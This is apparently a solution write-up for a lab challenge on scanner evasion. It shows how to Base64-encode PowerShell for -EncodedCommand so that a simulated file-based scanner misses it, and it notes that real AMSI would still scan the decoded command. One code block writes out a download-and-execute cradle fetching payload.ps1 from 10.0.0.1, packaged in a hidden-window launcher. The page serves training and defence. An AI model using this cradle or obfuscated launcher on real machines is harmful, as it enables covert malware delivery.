---
title: "Solution 34: Base64 Encoded Command (-EncodedCommand)"
challenge_number: 34
difficulty: easy
category: "AMSI Bypass"
permalink: /solutions/34-base64-encoded-command/
---

# Solution: Base64 Encoded Command (-EncodedCommand)

[Back to Challenge](../challenges/34-base64-encoded-command.md)

## Overview

Encode the entire payload as a UTF-16LE Base64 string and pass it to `powershell.exe -EncodedCommand`. The launcher script on disk contains only the Base64 blob — no signature strings exist as readable text. A file-based scanner cannot detect the payload without decoding.

## Working Code

### Encoding a Payload

```powershell
# The command you want to execute (contains detectable strings)
$cmd = 'Write-Host "malware loaded successfully"'

# Encode to UTF-16LE bytes (PowerShell's native encoding for -EncodedCommand)
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)

# Convert to Base64
$encoded = [Convert]::ToBase64String($bytes)

# Display - this is what goes into the launcher
Write-Host "Encoded: $encoded"
# Output: VwByAGkAdABlAC0ASABvAHMAdAAgACIAbQBhAGwAdwBhAHIAZQAgAGwAbwBhAGQAZQBkACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIgA=
```

### The Launcher Script (What Lives on Disk)

```powershell
# launcher.ps1 - this file contains NO detectable signature strings
$e = "VwByAGkAdABlAC0ASABvAHMAdAAgACIAbQBhAGwAdwBhAHIAZQAgAGwAbwBhAGQAZQBkACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIgA="
powershell.exe -EncodedCommand $e
```

### Direct Command-Line Usage

```cmd
powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAbQBhAGwAdwBhAHIAZQAgAGwAbwBhAGQAZQBkACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIgA=
```

### Complete Encode-and-Execute Pipeline

```powershell
# Step 1: Define any arbitrary payload
$payload = @'
$wc = New-Object System.Net.WebClient
$data = $wc.DownloadString("http://10.0.0.1/payload.ps1")
Invoke-Expression $data
Write-Host "malware payload executed"
'@

# Step 2: Encode
$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
$enc = [Convert]::ToBase64String($bytes)

# Step 3: Write the launcher to disk (clean file - no signatures)
$launcher = "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand $enc"
Set-Content -Path "launcher.bat" -Value $launcher

# The .bat file on disk only contains Base64 characters + the powershell command
```

### Helper: Decode to Verify

```powershell
# Decode an existing -EncodedCommand payload to see what it does
$encoded = "VwByAGkAdABlAC0ASABvAHMAdAAgACIAbQBhAGwAdwBhAHIAZQAgAGwAbwBhAGQAZQBkACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIgA="
$decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))
Write-Host "Decoded: $decoded"
# Output: Write-Host "malware loaded successfully"
```

## Why It Works

### Against File-Based Scanners

The file on disk (`launcher.ps1` or `launcher.bat`) contains:
```
powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAg...
```

The scanner reads this file byte-by-byte looking for signatures like `malware`, `Invoke-Mimikatz`, etc. It finds only:
- `powershell.exe` — legitimate system binary name
- `-EncodedCommand` — a standard PowerShell parameter
- Base64 characters (A-Z, a-z, 0-9, +, /, =)

The word "malware" in UTF-16LE Base64 becomes `bQBhAGwAdwBhAHIAZQA=` — completely unrecognizable to a byte-pattern scanner.

### Against Real AMSI (Important Caveat)

A real AMSI implementation **would** scan the decoded command before execution. When PowerShell processes `-EncodedCommand`:
1. It decodes the Base64 to UTF-16LE
2. It converts to a string
3. It passes that string to AMSI for scanning
4. Only then does it execute

However, our simulated scanner is file-based only. It scans the `.ps1` file on disk, not the runtime decoded content. This is why the bypass works against our scanner but would NOT bypass a real AMSI provider.

### UTF-16LE Requirement

PowerShell's `-EncodedCommand` expects UTF-16LE (little-endian Unicode) encoding. This is why we use `[System.Text.Encoding]::Unicode` (which is UTF-16LE in .NET) rather than UTF-8:

```
"malware" in UTF-8 bytes:  6D 61 6C 77 61 72 65
"malware" in UTF-16LE:     6D 00 61 00 6C 00 77 00 61 00 72 00 65 00
"malware" in Base64(UTF-16LE): bQBhAGwAdwBhAHIAZQA=
```

## How to Verify

1. Create the test payload:
   ```powershell
   $cmd = 'Write-Host "malware loaded"'
   $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
   $encoded = [Convert]::ToBase64String($bytes)
   Set-Content -Path "test_encoded.ps1" -Value "powershell.exe -EncodedCommand $encoded"
   ```

2. Verify no signatures exist in the file:
   ```powershell
   $content = Get-Content "test_encoded.ps1" -Raw
   Write-Host "Contains 'malware': $($content -match 'malware')"
   # Output: Contains 'malware': False
   ```

3. Run the scanner:
   ```
   nim_antimalware_sim.exe test_encoded.ps1
   ```
   Expected: **No detection** — the file contains no signature strings.

4. Execute the file to prove the payload works:
   ```powershell
   & .\test_encoded.ps1
   # Output: malware loaded
   ```

5. Confirm round-trip encoding is correct:
   ```powershell
   $decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))
   Write-Host "Decoded matches original: $($decoded -eq $cmd)"
   # Output: True
   ```
